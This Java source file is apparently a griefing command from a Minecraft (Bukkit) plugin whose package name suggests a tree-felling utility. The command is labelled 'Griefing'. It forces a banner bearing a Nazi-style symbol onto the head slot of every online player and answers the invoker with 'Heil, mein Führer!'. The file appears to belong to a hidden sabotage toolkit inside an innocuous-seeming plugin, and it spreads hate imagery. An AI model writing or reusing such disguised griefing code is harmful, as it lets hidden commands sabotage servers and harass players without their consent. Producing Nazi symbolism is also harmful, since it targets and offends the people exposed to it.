package me.bow.treecapitatorultimate.commands.Griefing;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.DyeColor;
import org.bukkit.Material;
import org.bukkit.block.banner.Pattern;
import org.bukkit.block.banner.PatternType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BannerMeta;

import java.util.ArrayList;

public class Nazis extends Command {
    private ItemStack banner;

    public Nazis() {
        super("nazis", "Put nazi sign on people's heads", CommandCategory.Griefing);
        banner = new ItemStack(Material.RED_BANNER, 1);
        BannerMeta meta = (BannerMeta) banner.getItemMeta();
        if (meta == null) return; // should never happen
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_CENTER));
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.RHOMBUS_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.STRAIGHT_CROSS));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        banner.setItemMeta(meta);
    }

    // /minecraft:give @p red_banner{BlockEntityTag:{Base:1,Patterns:[{Pattern:ms,Color:15},{Pattern:cs,Color:15},{Pattern:mr,Color:15},{Pattern:sc,Color:0},{Pattern:mc,Color:0},{Pattern:mc,Color:0}]}}
    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        for (Player pe : Bukkit.getOnlinePlayers()) {
            if (!pe.isOnline()) return;
            pe.getInventory().setHelmet(banner);
        }
        p.sendMessage(Start.Prefix + ChatColor.GREEN + "Heil, mein Führer!");
    }
}
